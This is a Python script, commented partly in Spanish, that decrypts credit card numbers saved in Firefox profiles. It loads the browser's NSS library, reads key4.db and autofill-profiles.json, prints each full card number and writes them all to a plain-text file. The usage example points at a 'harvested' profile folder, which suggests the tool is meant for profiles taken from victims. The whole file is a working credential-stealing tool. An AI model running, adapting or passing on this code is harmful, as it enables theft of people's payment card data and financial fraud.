#!/usr/bin/env python3
"""
Firefox Credit Cards Decryptor
Descifra tarjetas de crédito de Firefox usando NSS

Uso:
    python firefox_decrypt_cards.py <profile_directory>
"""

import os
import sys
import json
import base64
import ctypes
from pathlib import Path
from ctypes import *

# NSS Library Loading
try:
    if sys.platform == 'win32':
        nss_paths = [
            r"C:\Program Files\Mozilla Firefox\nss3.dll",
            r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll",
        ]
        nss_lib = None
        for path in nss_paths:
            if os.path.exists(path):
                nss_lib = ctypes.CDLL(path)
                print(f"[+] NSS library loaded from: {path}")
                break
        if not nss_lib:
            raise FileNotFoundError("nss3.dll not found")
    else:
        nss_lib = ctypes.CDLL("libnss3.so")
        print("[+] NSS library loaded: libnss3.so")
except Exception as e:
    print(f"[!] ERROR: Cannot load NSS library: {e}")
    sys.exit(1)


# NSS Structures
class SECItem(Structure):
    _fields_ = [
        ('type', c_int),
        ('data', c_void_p),
        ('len', c_int)
    ]


# NSS Functions
NSS_Init = nss_lib.NSS_Init
NSS_Init.argtypes = [c_char_p]
NSS_Init.restype = c_int

PK11SDR_Decrypt = nss_lib.PK11SDR_Decrypt
PK11SDR_Decrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]
PK11SDR_Decrypt.restype = c_int

NSS_Shutdown = nss_lib.NSS_Shutdown
NSS_Shutdown.argtypes = []
NSS_Shutdown.restype = c_int


def decrypt_value(encrypted_b64: str, profile_path: str) -> str:
    """
    Descifra un valor usando NSS
    """
    try:
        # Decodificar Base64
        encrypted_data = base64.b64decode(encrypted_b64)
        
        # Crear SECItem para datos cifrados
        encrypted_item = SECItem()
        encrypted_item.data = cast(c_char_p(encrypted_data), c_void_p)
        encrypted_item.len = len(encrypted_data)
        
        # Crear SECItem para resultado
        decrypted_item = SECItem()
        
        # Descifrar
        result = PK11SDR_Decrypt(byref(encrypted_item), byref(decrypted_item), None)
        
        if result != 0:
            return None
        
        # Extraer resultado
        decrypted_data = string_at(decrypted_item.data, decrypted_item.len)
        
        return decrypted_data.decode('utf-8', errors='ignore')
    
    except Exception as e:
        print(f"      [!] Decrypt error: {e}")
        return None


def process_firefox_cards(profile_dir: str):
    """
    Procesa tarjetas de crédito de un perfil de Firefox
    """
    profile_path = Path(profile_dir)
    
    # Verificar archivos necesarios
    key4_db = profile_path / "key4.db"
    json_path = profile_path / "autofill-profiles.json"
    
    if not key4_db.exists():
        print(f"[!] ERROR: key4.db not found in {profile_dir}")
        return
    
    if not json_path.exists():
        print(f"[!] ERROR: autofill-profiles.json not found in {profile_dir}")
        return
    
    print(f"\n{'='*60}")
    print(f"[+] Processing Firefox Credit Cards: {profile_path.name}")
    print(f"{'='*60}\n")
    
    # Inicializar NSS con el perfil
    print(f"[*] Initializing NSS with profile: {profile_path}")
    if NSS_Init(str(profile_path).encode('utf-8')) != 0:
        print(f"[!] ERROR: NSS_Init failed")
        print(f"[!] Possible causes:")
        print(f"    - Master Password is set (try empty password)")
        print(f"    - key4.db is corrupted")
        print(f"    - Wrong profile directory")
        return
    
    print(f"[+] NSS initialized successfully\n")
    
    # Leer JSON
    with open(json_path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    
    # Extraer tarjetas
    cards = data.get('creditCards', [])
    
    if not cards:
        print("[!] No credit cards found in profile")
        NSS_Shutdown()
        return
    
    print(f"[+] Found {len(cards)} credit card(s)\n")
    
    # Procesar cada tarjeta
    decrypted_cards = []
    
    for i, card in enumerate(cards, 1):
        print(f"[Card #{i}]")
        
        name = card.get('cc-name', 'N/A')
        card_type = card.get('cc-type', 'N/A')
        exp_month = card.get('cc-exp-month', '?')
        exp_year = card.get('cc-exp-year', '?')
        masked_number = card.get('cc-number', '')
        encrypted_number = card.get('cc-number-encrypted', '')
        
        print(f"  Name: {name}")
        print(f"  Type: {card_type}")
        print(f"  Expiration: {exp_month}/{exp_year}")
        
        if masked_number:
            print(f"  Number (masked): {masked_number}")
        
        # Intentar descifrar
        if encrypted_number:
            print(f"  Encrypted data: {encrypted_number[:40]}...")
            print(f"  [*] Attempting to decrypt...")
            
            decrypted = decrypt_value(encrypted_number, str(profile_path))
            
            if decrypted:
                print(f"  ✅ SUCCESS! Card Number: {decrypted}")
                
                decrypted_cards.append({
                    'name': name,
                    'type': card_type,
                    'number': decrypted,
                    'exp_month': exp_month,
                    'exp_year': exp_year,
                })
            else:
                print(f"  ❌ FAILED - Could not decrypt")
                print(f"     Possible reasons:")
                print(f"     - Master Password is set")
                print(f"     - Encryption format changed")
        else:
            print(f"  ⚠️  No encrypted data found")
        
        print()
    
    # Limpiar NSS
    NSS_Shutdown()
    
    # Guardar resultados
    if decrypted_cards:
        output_file = profile_path / "decrypted_credit_cards.txt"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"Firefox Credit Cards - Decrypted\n")
            f.write(f"Profile: {profile_path.name}\n")
            f.write(f"{'='*60}\n\n")
            
            for i, card in enumerate(decrypted_cards, 1):
                f.write(f"[Card #{i}]\n")
                f.write(f"  Name: {card['name']}\n")
                f.write(f"  Type: {card['type']}\n")
                f.write(f"  Number: {card['number']}\n")
                f.write(f"  Expiration: {card['exp_month']}/{card['exp_year']}\n\n")
        
        print(f"{'='*60}")
        print(f"[+] Successfully decrypted {len(decrypted_cards)} card(s)")
        print(f"[+] Results saved to: {output_file}")
    else:
        print(f"{'='*60}")
        print(f"[!] No cards could be decrypted")
        print(f"[!] This usually means Master Password is set")


def main():
    if len(sys.argv) < 2:
        print("Usage: python firefox_decrypt_cards.py <profile_directory>")
        print("\nExample:")
        print("  python firefox_decrypt_cards.py harvested/firefox/foqs9fmi.default-release/")
        sys.exit(1)
    
    profile_dir = sys.argv[1]
    
    if not os.path.isdir(profile_dir):
        print(f"[!] ERROR: Directory not found: {profile_dir}")
        sys.exit(1)
    
    process_firefox_cards(profile_dir)


if __name__ == "__main__":
    main()
